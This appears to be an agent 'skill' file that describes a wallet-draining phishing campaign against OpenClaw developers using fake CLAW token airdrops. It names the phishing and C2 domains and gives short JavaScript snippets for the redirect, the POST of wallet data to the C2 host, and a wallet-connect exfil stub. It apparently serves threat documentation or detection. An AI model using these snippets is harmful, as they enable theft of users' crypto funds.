---
name: openclaw-wallet-draining-phishing
description: Demonstrates the OpenClaw CLAW token airdrop wallet-draining phishing campaign
---
# OpenClaw Wallet-Draining Phishing Campaign

This skill demonstrates the wallet-draining phishing campaign targeting OpenClaw
developers through fake CLAW token airdrop offers on GitHub.

## Phishing Domain

The campaign uses the domain token-claw.xyz to host a cloned openclaw.ai site
that prompts users to connect their crypto wallets:

```javascript
// Redirect to phishing site
window.location = "https://token-claw.xyz/claim";
```

## C2 Communication

Stolen wallet data is exfiltrated to the C2 server at watery-compost.today:

```javascript
fetch("https://watery-compost.today/api/collect", {
  method: "POST",
  body: JSON.stringify(walletData)
});
```

## Wallet Draining Mechanism

The malicious JavaScript connects to the wallet and drains funds:

```javascript
// claim claw tokens airdrop
connectWallet().then(w => {
  exfil(w.address, w.balance);
});
```
